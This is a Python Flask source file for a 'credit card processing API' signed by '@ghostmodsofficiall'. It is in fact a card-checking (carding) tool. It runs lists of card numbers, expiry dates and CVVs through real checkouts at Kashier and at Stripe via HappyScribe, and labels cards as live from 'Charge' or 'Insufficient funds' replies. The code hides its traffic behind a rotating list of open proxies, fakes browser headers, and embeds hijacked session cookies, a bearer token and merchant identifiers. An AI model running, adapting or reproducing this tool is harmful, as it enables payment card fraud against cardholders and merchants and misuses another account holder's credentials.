from flask import Flask, request, jsonify
import requests, re, time, random, pyfiglet
from colorama import Fore
import user_agent

app = Flask(__name__)

# Common functions
def get_bin_info(bin_number):
    try:
        api_url = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}").json()
        return {
            'brand': api_url["brand"],
            'type': api_url["type"],
            'level': api_url["level"],
            'bank': api_url["bank"],
            'country_name': api_url["country_name"],
            'country_flag': api_url["country_flag"]
        }
    except Exception as e:
        print(e)
        return None

def remove_year_prefix(combo_line):
    parts = combo_line.strip().split('|')
    if len(parts) >= 3:
        year = parts[2]
        if year.startswith('20'):
            year = year[2:]
        parts[2] = year
        return '|'.join(parts)
    return combo_line

# Payment processors
class KashierProcessor:
    def __init__(self, card_data):
        self.card = self._parse_card(card_data)
        self.session = requests.Session()
        self.token = None
        self.result = None

    def _parse_card(self, data):
        parts = data.strip().split("|")
        if len(parts) < 4: return None
        year = parts[2][2:] if parts[2].startswith("20") else parts[2]
        return {
            'number': parts[0],
            'month': parts[1],
            'year': year,
            'cvv': parts[3]
        }

    def _get_headers(self, hash_val):
        return {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json',
            'Kashier-Hash': hash_val,
            'Origin': 'https://checkout.kashier.io',
            'Referer': 'https://checkout.kashier.io/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"'
        }

    def _init_auth(self):
        headers = self._get_headers('8d6a9d71cf7b5ab13b1ae36f16d1f34a1236f1af14cbb279c99f273ec605fe54')
        data = {
            'apiOperation': 'INITIATE_AUTHENTICATION',
            'paymentMethod': {'type': 'CARD','card': {'number': self.card['number'],'save': False,'enable3DS': True}},
            'order': {'reference': '5093e256-7178-49ce-8345-65278bbd3a5b','amount': '484.00','currency': 'EGP','description': 'Credit'},
            'device': {'browserDetails': {'javaEnabled': False,'language': 'ar-IQ','screenHeight': 668,'screenWidth': 360,'timeZone': -180,'colorDepth': 24,'acceptHeaders': 'application/json','3DSecureChallengeWindowSize': '390_X_400'},'browser': 'Chrome'},
            'reconciliation': {'webhookUrl': 'https://oneline-eg.com/payments/verify/kashier?website=oneline-eg.com','merchantRedirect': 'https://oneline-eg.com/payments/verify/kashier'},
            'interactionSource': 'ECOMMERCE',
            'metaData': {'kashier payment UI version': 'V2'},
            'merchantId': 'MID-22991-740',
            'timestamp': -3
        }
        response = self.session.post('https://fep.kashier.io/v3/orders', headers=headers, json=data)
        self.token = response.json()['response']['order']['systemOrderId']
        return bool(self.token)

    def _process_payment(self):
        headers = self._get_headers('ce9b8035c5ce420d0778c93ba233b12d4b64e6bd643a378609fead697487f5f9')
        data = {
            'apiOperation': 'PAY',
            'paymentMethod': {'type': 'CARD','card': {'number': self.card['number'],'expiry': {'month': self.card['month'],'year': self.card['year']},'nameOnCard': 'Tome Aalo','securityCode': self.card['cvv']}},
            'interactionSource': 'ECOMMERCE',
            'metaData': {'kashier payment UI version': 'V2'},
            'merchantId': 'MID-22991-740'
        }
        response = requests.put(f'https://fep.kashier.io/v3/orders/{self.token}', headers=headers, json=data)
        self.result = response.json()["messages"]["en"]
        return self.result

    def execute(self):
        if not self.card: return "Invalid card"
        if not self._init_auth(): return "Auth failed"
        msg = self._process_payment()
        if 'Insufficient funds' in msg: return 'Insufficient funds ✅'
        if any(x in msg for x in ['Payment was completed','Payment was complete','Transaction completed successfully','Payment has been successfully processed','has been successfully']): return 'Charge ✅'
        return msg

class StripeProcessor:
    def __init__(self, card_data):
        self.card = self._parse_card(card_data)
        self.proxy = self._get_proxy()

    def _parse_card(self, data):
        parts = data.strip().split("|")
        if len(parts) < 4: return None
        return {
            'number': parts[0],
            'month': parts[1],
            'year': parts[2],
            'cvv': parts[3]
        }

    def _get_proxy(self):
        proxy_list = [
            '135.181.150.104:8080',
            '135.181.45.15:8080',
            '34.151.231.232:3129',
            '128.140.7.236:8080',
            '34.254.90.167:9812',
            '129.154.225.163:8100',
            '80.51.221.125:8080',
            '114.129.19.139:8080',
            '183.221.242.107:8443',
            '103.84.253.10:80',
            '154.70.107.81:3128',
            '204.199.174.13:999',
            '102.165.51.172:3128',
            '103.159.96.110:8085',
            '176.95.54.202:83',
            '35.247.221.112:3129',
            '170.79.12.75:9090',
            '190.61.97.229:999',
            '103.83.179.78:2016',
            '77.89.35.50:8080',
            '40.76.245.70:8080',
            '64.225.8.118:9989',
            '190.19.114.104:8080',
            '149.154.157.17:5678',
            '114.4.233.34:8080',
            '186.97.102.68:999',
            '62.201.223.7:8183',
            '202.8.74.9:8080',
            '157.245.144.111:8080',
            '183.221.242.103:9443',
            '36.74.163.65:8080',
            '201.131.239.233:999',
            '218.207.72.202:3128',
            '171.6.7.198:8080',
            '79.106.170.34:8989',
            '162.212.156.172:8080',
            '179.63.149.4:999',
            '186.121.235.66:8080',
            '103.36.35.135:8080',
            '190.217.105.194:8080',
            '182.53.85.34:8080',
            '103.69.108.78:8191',
            '36.37.146.119:32650',
            '186.150.201.38:8080',
            '35.198.9.82:3129',
            '61.139.26.94:3128',
            '103.169.19.130:8080',
            '35.198.63.193:3129',
            '34.95.187.223:3129',
            '45.174.87.18:999',
            '202.69.38.82:8080',
            '200.123.29.45:3128',
            '103.52.213.131:80',
            '45.61.187.67:4000',
            '45.61.187.67:4006',
            '45.61.187.67:4001',
            '45.61.187.67:4004',
            '45.61.187.67:4009',
            '34.118.86.227:8585',
            '34.125.184.194:8080',
            '34.174.159.253:8585',
            '34.172.175.72:8585',
            '34.162.190.6:8585'
        ]
        return random.choice(proxy_list)

    def _get_payment_method_id(self):
        url = 'https://api.stripe.com/v1/payment_methods'
        head = {
            'accept': 'application/json',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en,en-US;q=0.9,ar;q=0.8',
            'cache-control': 'no-cache',
            'content-length': '368',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': str(user_agent.generate_user_agent()),
        }
        data = f'type=card&billing_details[name]=drjhyhjghdjhfjh+dfdfdf&card[number]={self.card["number"]}&card[cvc]={self.card["cvv"]}&card[exp_month]={self.card["month"]}&card[exp_year]={self.card["year"]}&guid=NA&muid=8a1b8fbf-c986-4119-a63a-54f5eb137b8649eb01&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F445bde116e%3B+stripe-js-v3%2F445bde116e%3B+split-card-element&time_on_page=96120&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S'
        
        try:
            req = requests.post(url, headers=head, data=data, proxies={'http': self.proxy, 'https': self.proxy})
            if 'id' in req.json():
                return req.json()['id']
        except:
            pass
        return None

    def execute(self):
        if not self.card: return {"status": "error", "message": "Invalid card"}
        
        payment_method_id = self._get_payment_method_id()
        if not payment_method_id:
            return {"status": "error", "message": "Failed to get payment method"}
        
        cookies = {
            'ahoy_visitor': 'aed6f8b1-1d21-460d-a2d2-06f1f3b1d6e0',
            '_gcl_au': '1.1.126030997.1687104135',
            '_fbp': 'fb.1.1687104136908.898856357',
            '_lfa': 'LF1.1.c95b69089175f29b.1687104137941',
            'hubspotutk': '6386e5f1968bda4dbfeb2aa2e775be53',
            '_uetvid': '7e2949b00df111ee9e1b67cb597c737a',
            'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IlcxczNOelUyTlRRMFhTd2lNbmxYUW5wNFYySkNVMHh0VEdZekxVeFRhbElpTENJeE5qZzNNVEEwTVRZMkxqVXdOek0zT1RnaVhRPT0iLCJleHAiOiIyMDIzLTA3LTAyVDE2OjAyOjQ2LjUwN1oiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ccdf112b02a05d6305b0b87361363fde8d7bec9f',
            'unsecure_is_signed_in': '1',
            'intercom-device-id-frdatdus': '3b061260-939e-498f-8323-6baff7e26422',
            '__stripe_mid': '8a1b8fbf-c986-4119-a63a-54f5eb137b8649eb01',
            'ahoy_visit': '4090416e-741c-472c-8717-f37472cc443b',
            '_gid': 'GA1.2.858391144.1687599217',
            '__hstc': '171462591.6386e5f1968bda4dbfeb2aa2e775be53.1687104141745.1687184702695.1687599222485.4',
            '__hssrc': '1',
            '_transcribe_session': 'OFaX7Y3iZbmzQFm9V9sol7z%2Fd7Y4MO5SqIy145UtzvWjTfz3hEx52McWa%2Bg%2BBwPGubnFTiAdnx8k%2FL6b9JACcoIFZn%2BebWgqILEJzLG6sTLSLbMe%2Fsb9FSw3HbVDyuQjImnQ2rWcRFoRlvxpHh%2B9rFSyqnMDFQsyv%2BL%2Bz2pa50K6X%2BLihyv2MrMX2QCj67KyILqoZIw5ia2BkER6APEcGYK4cymYKjrcpmkRQESgBA9Y7aMI2CR2dgnqzANWw9Ja8AlgAshlqkqeNHmPt4Za5xQyfqTlpcB6yHBdHSRdrnTCB7laZE4g%2Ff9GrpgzYjv6BJNRLOH1unY9twckJpJ0N%2BFA%2BHtftLiSuICWvNUldz41zfgOA9rtrvlkIC6a4niimIOsXoV6zJtEz6awg7kSR2M4lQ%3D%3D--Ne7LLajgi5Dhua%2Bw--TC6o07mK83cXMUcFIYu68w%3D%3D',
            '_ga': 'GA1.1.1376273022.1687104134',
            '_ga_4T8KCV9Y2D': 'GS1.1.1687599216.5.1.1687599248.28.0.0',
            '__hssc': '171462591.2.1687599222485',
            'intercom-session-frdatdus': 'ZlBIelVBU1U1aU1qUzNsdGQ2RHVmaVpiTUJ0K0kzVFF3aXpQQ3ZkRlF0SytRKzcyajUrZGdJcWtFc1J6TnZCMy0tMExvSHZUKytMVzg1a2VKRy92Rlpkdz09--76405ed3659f42abb7a0a40684c40815d6aa30f7',
            '__stripe_sid': '2f15c106-9c2c-4086-b1e4-29d51c9cd02c1c661d',
        }

        head = {
            'accept': 'application/json',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en,en-US;q=0.9,ar;q=0.8',
            'authorization': 'Bearer Du9DAsrKpz1eQ7u91yIsrwtt',
            'cache-control': 'no-cache',
            'content-length': '428',
            'content-type': 'application/json',
            'origin': 'https://www.happyscribe.com',
            'pragma': 'no-cache',
            'referer': 'https://www.happyscribe.com/v2/7810988/checkout?plan=slider_prepaid&hours=1',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            "id": "7490062",
            "address": "137 Vesey Street",
            "name": "drjhyhjghdjhfjh dfdfdf",
            "country": "US",
            "vat": "null",
            "billing_account_id": "7490062",
            "last4": "9574",
            "orderReference": "ezgtmqzgo",
            "user_id": "7918615",
            "organization_id": "7810988",
            "hours": "1",
            "balance_increase_in_cents": "null",
            "payment_method_id": payment_method_id,
            "transcription_id": "null",
            "plan": "slider_prepaid",
            "order_id": "null",
            "recurrence_interval": "null",
            "extra_plan_hours": "null"
        }

        try:
            req = requests.post(
                'https://www.happyscribe.com/api/iv1/confirm_payment',
                cookies=cookies,
                headers=head,
                json=data,
                proxies={'http': self.proxy, 'https': self.proxy}
            )
            
            if "Your card has insufficient funds." in req.json().get('error', ''):
                return {"status": "success", "message": "Insufficient funds ✅", "type": "live"}
            elif 'requires_action' in req.json():
                return {"status": "success", "message": "3D Secure required", "type": "live"}
            elif 'error' in req.json():
                return {"status": "error", "message": req.json()['error']}
            else:
                return {"status": "success", "message": "Charge successful ✅", "type": "live"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

# API Endpoints
@app.route('/')
def index():
    return "By, @ghostmodsofficiall - Credit Card Processing API"

@app.route('/bin_info/<bin_number>')
def bin_info(bin_number):
    info = get_bin_info(bin_number)
    if info:
        return jsonify({
            "status": "success",
            "data": info,
            "message": "By, @ghostmodsofficiall"
        })
    else:
        return jsonify({
            "status": "error",
            "message": "No bin info found. By, @ghostmodsofficiall"
        })

@app.route('/process/kashier', methods=['POST'])
def process_kashier():
    data = request.json
    if not data or 'card' not in data:
        return jsonify({
            "status": "error",
            "message": "Card data required. By, @ghostmodsofficiall"
        })
    
    processor = KashierProcessor(data['card'])
    result = processor.execute()
    
    bin_data = get_bin_info(data['card'][:6]) if len(data['card']) >= 6 else None
    
    response = {
        "status": "success" if "✅" in result else "error",
        "result": result,
        "bin_info": bin_data,
        "message": "By, @ghostmodsofficiall"
    }
    
    return jsonify(response)

@app.route('/process/stripe', methods=['POST'])
def process_stripe():
    data = request.json
    if not data or 'card' not in data:
        return jsonify({
            "status": "error",
            "message": "Card data required. By, @ghostmodsofficiall"
        })
    
    processor = StripeProcessor(data['card'])
    result = processor.execute()
    
    bin_data = get_bin_info(data['card'][:6]) if len(data['card']) >= 6 else None
    
    response = {
        "status": result["status"],
        "result": result["message"],
        "type": result.get("type"),
        "bin_info": bin_data,
        "message": "By, @ghostmodsofficiall"
    }
    
    return jsonify(response)

@app.route('/process/batch', methods=['POST'])
def process_batch():
    data = request.json
    if not data or 'cards' not in data or 'gateway' not in data:
        return jsonify({
            "status": "error",
            "message": "Cards list and gateway required. By, @ghostmodsofficiall"
        })
    
    results = []
    for card in data['cards']:
        card = remove_year_prefix(card)
        if data['gateway'].lower() == 'kashier':
            processor = KashierProcessor(card)
            result = processor.execute()
        elif data['gateway'].lower() == 'stripe':
            processor = StripeProcessor(card)
            result = processor.execute()["message"]
        else:
            result = "Unsupported gateway"
        
        bin_data = get_bin_info(card[:6]) if len(card) >= 6 else None
        
        results.append({
            "card": card,
            "result": result,
            "bin_info": bin_data
        })
    
    return jsonify({
        "status": "success",
        "results": results,
        "message": "By, @ghostmodsofficiall"
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
